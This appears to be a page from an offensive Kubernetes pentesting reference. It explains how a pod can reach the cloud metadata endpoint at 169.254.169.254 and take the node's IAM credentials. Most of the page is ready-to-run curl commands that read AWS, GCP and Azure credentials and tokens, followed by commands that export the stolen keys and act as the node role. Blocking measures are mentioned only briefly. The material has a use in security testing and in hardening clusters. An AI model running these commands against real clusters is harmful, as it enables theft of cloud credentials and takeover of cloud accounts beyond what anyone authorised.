---
title: "Cloud metadata from pod: reaching node instance credentials"
order: 4
description: "A Kubernetes pod on a cloud node can usually reach the instance metadata service at 169.254.169.254 unless it is explicitly blocked. That endpoint returns the node's IAM role credentials, which typically carry far more cloud permission than the pod should have, turning a pod foothold into cloud account access."
keywords:
  - instance metadata
  - 169.254.169.254
  - imds
  - node iam role
  - cloud credentials
---

# Cloud metadata from pod

On a managed cloud cluster, each node is a virtual machine with an attached IAM role, and the cloud instance metadata service exposes that role's credentials at the link-local address `169.254.169.254`. Unless the cluster explicitly blocks pod access to it (with a NetworkPolicy, a metadata proxy, or the hop-limit control on some clouds), a pod reaches the endpoint and reads the node's credentials. Node roles are commonly over-permissioned, so this converts a pod foothold into cloud-account access that dwarfs the pod's Kubernetes rights.

```bash
# AWS IMDSv1 (no token) or IMDSv2 (requires a session token first)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
R=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$R   # AccessKeyId/SecretAccessKey/Token
# IMDSv2 handshake if v1 is disabled
TOK=$(curl -s -XPUT http://169.254.169.254/latest/api/token \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -s -H "X-aws-ec2-metadata-token: $TOK" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP (requires the Metadata-Flavor header)
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS
curl -s -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
```

## Using the credentials

```bash
# AWS: export the returned keys and act as the node role
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws ec2 describe-instances; aws s3 ls                  # scope depends on the node role
```

## Exploitation notes

- The node role is usually broader than any single pod needs (it must support the kubelet, CNI, volume, and logging integrations), so its credentials frequently unlock storage, other instances, and sometimes cluster-wide cloud actions.
- IMDSv2 only adds a token handshake, not authentication; a pod that can reach the endpoint still retrieves credentials, so a reachable IMDS is exposure regardless of version.
- Blocking is the exception, not the rule: a NetworkPolicy denying `169.254.169.254`, a metadata proxy, or a hop limit of 1 defeats it; test reachability before assuming it is blocked.
- Distinct from the node role, a pod may hold its own cloud identity via workload identity; see [Cloud IAM via workload identity](../lateral-movement/cloud-iam-via-workload-identity.md).

## References

- [AWS: instance metadata service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [GCP: VM metadata server](https://cloud.google.com/compute/docs/metadata/overview)
- [HackTricks: cloud metadata SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf)
